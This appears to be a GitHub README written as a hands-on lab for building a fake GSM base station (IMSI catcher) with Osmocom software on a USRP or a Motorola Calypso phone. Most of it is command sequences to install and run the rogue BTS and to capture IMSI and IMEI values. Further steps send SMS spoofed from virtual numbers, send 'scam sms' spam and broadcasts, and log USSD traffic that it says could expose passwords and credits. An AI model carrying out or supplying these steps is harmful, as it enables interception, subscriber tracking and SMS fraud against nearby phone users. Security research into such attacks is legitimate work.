# GSM2_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITHOUT-PHYSICAL-MS
* [motorola](https://www.youtube.com/watch?v=ZKa86zAWmQY&pp=ygURZ3NtIHNuaWZmaW5nIDI5YzM%3D) documentation
* [spoofing](https://github.com/godfuzz3r/osmo-nitb-scripts/tree/master)
* [phddays](https://sudonull.com/post/97315-MiTM-Mobile-contest-how-they-broke-mobile-communications-at-PHDays-V-Positive-Technologies-blog)
* [script](https://lucasteske.medium.com/creating-your-own-gsm-network-with-limesdr-1935bac257f4)
  
# Half MITM = Fake BTS only
<p align="center">
  <img width="600" height="400" src="https://github.com/SitrakaResearchAndPOC/GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS/blob/main/2G.jpg">
</p>

# Why it is possible ?
* Fake base station with open ciphering named A5/0, and the  network could be GSM(sms, call), and GPRS, EDGE

# Attack limitations and advantages 
* local attack but could be targeting (to find local victim)
* victim couldn't be reached on the real network (indeed call and sms)
* could be detectable with rooted phone and application like imsi-catcher detector, snoopsnitch because of open network

# Devices  
* USRP
* motorola phone (aka calypso phone on google)
* LimeSDR
  
# Pratices
* Install DragonOS 29 or 30
* Create fake bts with open ciphering (A5/0)
* sending sms as a virtual number 0341220590
* sending scam sms with many virtual number randomly to a specific number
* Send broadcast message as a virtual number 
* Homework : Change the virtual number 0341220590 as 0341220591


# Solutions :
* Solution 1 using USRP
(more stable and no need synchronization of existing BTS so if we jam the existing BTS the half mitm still exists)
```
wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts.zip
```
```
unzip osmo-nitb-scripts.zip
```
```
cd osmo-nitb-scripts
```
Database is at : /var/lib/osmocom/hlr.sqlite3    
Installing all config  
```
bash install_services.sh
```
For avoiding lock database error 
```
fuse -k /var/lib/osmocom/hlr.sqlite3
```
Open HLR.db
```
gedit scripts/HLR.py 
```
Change 
```
self.db = sqlite3.connect(hlr_loc)
```
By
```
self.db = sqlite3.connect(hlr_loc, timeout=3000)
```

Change spoof script2 modification
```
gedit scripts_spoof2/sending_source_dest.py  
```

Before launching sending_source_dest.py, please corret the help, change : 
```
usage: ./sms_broadcast.py extension message
This script sends a message from the specified extension (number) to all devices connected to this base station
```
to
```
usage: ./sending_source_dest.py extension_source extension_destination  message
This script sends a message from the specified extension source (number) to extension destination connected to this base station
```
Running the transceiver
```
osmo-trx-uhd -C /etc/osmocom/osmo-trx-uhd.cfg
```
Running main_uhd_spoof associate with configs/openbsc_spoof.cfg  
ctrl+shift+T  
```
cd osmo-nitb-scripts
```
```
python3 main_uhd_spoof.py
```
ctrl+shift+T
```
cd osmo-nitb-scripts/scripts_spoof2
```
Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
Tape `*#001#` for finding your phone number (extension with osmo-bts)   
```
python2 show_subscribers.py 
```
You could find imsi and extension  
Create a virtual extension 0341220590 and send sms to existing extension eg : 164
```
python2 sms_send_source_dest_msg.py 0341220590 164 "link gmail"
```
You could find imsi and extension  
```
python2 show_subscribers.py 
```
Creating many extensions for sending a scam sms repeat 3 times
```
python2 sms_spam.py 164 3 "link gmail"
```
You could find imsi and extension  
```
python2 show_subscribers.py 
```
Sending a broadcast sms by using a virtual number as extension 165
```
python2 sms_broadcast.py 165 "link gmail"
```
You could find imsi and extension  
```
python2 show_subscribers.py 
```
* Solution 1debug using USRP with manual and debug mode
```
wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts.zip
```
```
unzip osmo-nitb-scripts.zip
```
```
cd osmo-nitb-scripts
```
```
bash install_services.sh
```
For avoiding lock database error 
```
fuse -k /var/lib/osmocom/hlr.sqlite3
```
Open HLR.db
```
gedit scripts/HLR.py 
```
Change 
```
self.db = sqlite3.connect(hlr_loc)
```
By
```
self.db = sqlite3.connect(hlr_loc, timeout=3000)
```


Change spoof script2 modification
```
gedit scripts_spoof2/sending_source_dest.py  
```

Before launching sending_source_dest.py, please corret the help, change : 
```
usage: ./sms_broadcast.py extension message
This script sends a message from the specified extension (number) to all devices connected to this base station
```
to
```
usage: ./sending_source_dest.py extension_source extension_destination  message
This script sends a message from the specified extension source (number) to extension destination connected to this base station
```
Running the transceiver
```
osmo-trx-uhd -C /etc/osmocom/osmo-trx-uhd.cfg
```
ADDING DEBUG MODE OPTIONS :  --debug=DRLL:DCC:DMM:DRR:DRSL:DNM  
Database at : /var/lib/osmocom/hlr.sqlite3 
```
/usr/local/bin/osmo-nitb --yes-i-really-want-to-run-prehistoric-software -s -C -c /etc/osmocom2/osmo-nitb.cfg -l /var/lib/osmocom/hlr.sqlite3  --debug=DRLL:DCC:DMM:DRR:DRSL:DNM
```
Launching the bts on debug mode
ADDING DEBUG MODE OPTIONS : --debug DRSL:DOML:DLAPDM
```
/usr/local/bin/osmo-bts-trx -s -c /etc/osmocom2/osmo-bts-trx.cfg --debug DRSL:DOML:DLAPDM
```
Have a look on the terminal at the command : /usr/local/bin/osmo-nitb --yes-i-really-want-to-run-prehistoric-software -s -C -c /etc/osmocom2/osmo-nitb.cfg -l /var/lib/osmocom/hlr.sqlite3  --debug=DRLL:DCC:DMM:DRR:DRSL:DNM  


  
Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
Have a look on log for capturing IMSI and IMEI  

  
Tape `*#001#` for finding your phone number (extension with osmo-bts)   
Have a look on the log about USSD: Own number requested  

  
Tape USSD `*100*123#`
Have a look on log of USSB : Unhandled USSD  (possible to steal password and credits)
  

ctrl+shift+T
```
cd osmo-nitb-scripts/scripts_spoof2
```
Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
Tape `*#001#` for finding your phone number (extension with osmo-bts)   
```
python2 show_subscribers.py 
```
You could find imsi and extension  
Create a virtual extension 0341220590 and send sms to existing extension eg : 164
```
python2 sms_send_source_dest_msg.py 0341220590 164 "link gmail"
```
You could find imsi and extension  
```
python2 show_subscribers.py 
```
Creating many extensions for sending a scam sms repeat 3 times
```
python2 sms_spam.py 164 3 "link gmail"
```
You could find imsi and extension  
```
python2 show_subscribers.py 
```
Sending a broadcast sms by using a virtual number as extension 165
```
python2 sms_broadcast.py 165 "link gmail"
```
You could find imsi and extension  
```
python2 show_subscribers.py 
```

* Solution 2 : using one motorola phone  
(Not so stable and  need synchronization of existing BTS by finding arfcn of synchronization so if we jam the existing BTS the half mitm doesn't exist anymore)

Hardware setup 1 : Need battery and not programmable with arduino  

[serial_cable](https://osmocom.org/projects/baseband/wiki/Serial_Cable)    [smartspate](https://www.smartspate.com/how-to-create-2g-network-at-your-own-home/)   [sudonull](https://sudonull.com/post/69473-Launching-a-GSM-network-at-home-Pentestit-Blog)
<p align="center">
  <img src="https://github.com/SitrakaResearchAndPOC/GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS/blob/main/usb_motorola.jpg">
</p>

<p align="center">
  <img width="600" height="400" src="https://github.com/SitrakaResearchAndPOC/GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS/blob/main/usb_cable_final.png">
</p>


Hardware setup 2 : No need battery and programmable with arduino  
<p align="center">
  <img src="https://github.com/SitrakaResearchAndPOC/GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS/blob/main/USB_TTL.jpg">
</p>


Command you need : 
```
dmesg | grep ttyUSB*
```

```
wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts-calypsobts.zip
```
```
unzip osmo-nitb-scripts-calypsobts.zip 
```
```
cd osmo-nitb-scripts-calypsobts
```
Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
Installing network signal guru on your android phone  
And finding the arfcn that this one is connect  
Let's name this arfcn as 975  
Configure arfcn at services/osmo-trx-lms3.service as 975
```
gedit services/osmo-trx-lms3.service
```
Save the configuration
```
bash install_services.sh 
```
For avoiding lock database error 
```
fuse -k /var/lib/osmocom/hlr.sqlite3
```
Open HLR.db
```
gedit scripts/HLR.py 
```
Change 
```
self.db = sqlite3.connect(hlr_loc)
```
By
```
self.db = sqlite3.connect(hlr_loc, timeout=3000)
```

Change spoof script2 modification
```
gedit scripts_spoof2/sending_source_dest.py  
```

Before launching sending_source_dest.py, please corret the help, change : 
```
usage: ./sms_broadcast.py extension message
This script sends a message from the specified extension (number) to all devices connected to this base station
```
to
```
usage: ./sending_source_dest.py extension_source extension_destination  message
This script sends a message from the specified extension source (number) to extension destination connected to this base station
```

Running transceiver
```
bash trx.sh
```
Click button power of motorola phone  
Tape ctrl+shift+T
```
cd osmo-nitb-scripts-calypsobts
```
```
python3 main_spoof.py
```
ctrl+shift+T

```
cd osmo-nitb-scripts-calypsobts/scripts_spoof2
```
Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
Tape `*#001#` for finding your phone number (extension with osmo-bts)   
```
python2 show_subscribers.py 
```
You could find imsi and extension  
Create a virtual extension 0341220590 and send sms to existing extension eg : 164
```
python2 sms_send_source_dest_msg.py 0341220590 164 "link gmail"
```
You could find imsi and extension  
```
python2 show_subscribers.py 
```
Creating many extensions for sending a scam sms repeat 3 times
```
python2 sms_spam.py 164 3 "link gmail"
```
You could find imsi and extension  
```
python2 show_subscribers.py 
```
Sending a broadcast sms by using a virtual number as extension 165
```
python2 sms_broadcast.py 165 "link gmail"
```
You could find imsi and extension  
```
python2 show_subscribers.py 
```




Solution 2debug : using one motorola phone, manual script on debug mode
Command you need : 
```
dmesg | grep ttyUSB*
```
```
wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts-calypsobts.zip
```
```
unzip osmo-nitb-scripts-calypsobts.zip 
```
```
cd osmo-nitb-scripts-calypsobts
```
Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
Installing network signal guru on your android phone  
And finding the arfcn that this one is connect  
Let's name this arfcn as 975  
Configure arfcn at services/osmo-trx-lms3.service as 975
```
gedit services/osmo-trx-lms3.service
```
Save the configuration
```
bash install_services.sh 
```
For avoiding lock database error 
```
fuse -k /var/lib/osmocom/hlr.sqlite3
```
Open HLR.db
```
gedit scripts/HLR.py 
```
Change 
```
self.db = sqlite3.connect(hlr_loc)
```
By
```
self.db = sqlite3.connect(hlr_loc, timeout=3000)
```
Change spoof script2 modification
```
gedit scripts_spoof2/sending_source_dest.py  
```

Before launching sending_source_dest.py, please corret the help, change : 
```
usage: ./sms_broadcast.py extension message
This script sends a message from the specified extension (number) to all devices connected to this base station
```
to
```
usage: ./sending_source_dest.py extension_source extension_destination  message
This script sends a message from the specified extension source (number) to extension destination connected to this base station
```

Running transceiver
```
bash trx.sh
```
Click button power of motorola phone  
Tape ctrl+shift+T  
Launching osmo-nitb  with debug mode --debug=DRLL:DCC:DMM:DRR:DRSL:DNM
Database at : /usr/src/CalypsoBTS/hlr.sqlite3    
```
osmo-nitb --yes-i-really-want-to-run-prehistoric-software -c /usr/src/CalypsoBTS/openbsc.cfg -l /usr/src/CalypsoBTS/hlr.sqlite3 -P -C --debug=DRLL:DCC:DMM:DRR:DRSL:DNM
```
Launching osmo-bts  with debug mode option : --debug DRSL:DOML:DLAPDM
```
osmo-bts-trx -c /usr/src/CalypsoBTS/osmo-bts-trx-calypso.cfg --debug DRSL:DOML:DLAPDM -r 99
```

Have a look on the terminal at the command : /usr/local/bin/osmo-nitb --yes-i-really-want-to-run-prehistoric-software -s -C -c /etc/osmocom2/osmo-nitb.cfg -l /var/lib/osmocom/hlr.sqlite3  --debug=DRLL:DCC:DMM:DRR:DRSL:DNM  


  
Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
Have a look on log for capturing IMSI and IMEI  

  
Tape `*#001#` for finding your phone number (extension with osmo-bts)   
Have a look on the log about USSD: Own number requested  

  
Tape USSD `*100*123#`
Have a look on log of USSB : Unhandled USSD  (possible to steal password and credits)
  

ctrl+shift+T
```
cd osmo-nitb-scripts/scripts_spoof2
```
Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
Tape `*#001#` for finding your phone number (extension with osmo-bts)   
```
python2 show_subscribers.py 
```
You could find imsi and extension  
Create a virtual extension 0341220590 and send sms to existing extension eg : 164
```
python2 sms_send_source_dest_msg.py 0341220590 164 "link gmail"
```
You could find imsi and extension  
```
python2 show_subscribers.py 
```
Creating many extensions for sending a scam sms repeat 3 times
```
python2 sms_spam.py 164 3 "link gmail"
```
You could find imsi and extension  
```
python2 show_subscribers.py 
```
Sending a broadcast sms by using a virtual number as extension 165
```
python2 sms_broadcast.py 165 "link gmail"
```
You could find imsi and extension  
```
python2 show_subscribers.py 
```
